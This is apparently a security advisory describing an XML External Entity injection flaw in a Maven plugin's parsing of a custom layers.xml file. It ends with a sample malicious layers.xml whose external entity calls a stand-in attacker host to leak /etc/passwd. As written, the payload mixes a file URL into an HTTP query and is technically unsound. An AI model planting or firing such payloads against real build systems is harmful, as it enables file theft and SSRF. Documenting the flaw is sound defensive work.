Title: XML External Entity (XXE) Injection in Maven Plugin Custom Layers Parsing
Analysis:
In `AbstractPackagerMojo.java`, the `getDocumentIfAvailable` method reads an XML configuration file (`layers.xml` or custom layers file) and parses it using a default `DocumentBuilderFactory` instance without disabling external DTDs or external parameter entities. This makes the build plugin vulnerable to XML External Entity (XXE) injection attacks (CWE-611). An attacker who can control or influence the custom layers XML file (e.g., via a malicious pull request or a compromised source repository) can exploit this to read local files, trigger SSRF requests during build time, or exhaust resources.

Conceptual Payload (e.g., a malicious `layers.xml` custom configuration file):
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE custom-layers [
  <!ENTITY xxe SYSTEM "http://malicious-host.example.com/leak?data=file:///etc/passwd">
]>
<layers>
  <layer name="dependencies">
    <include>&xxe;</include>
  </layer>
</layers>
```
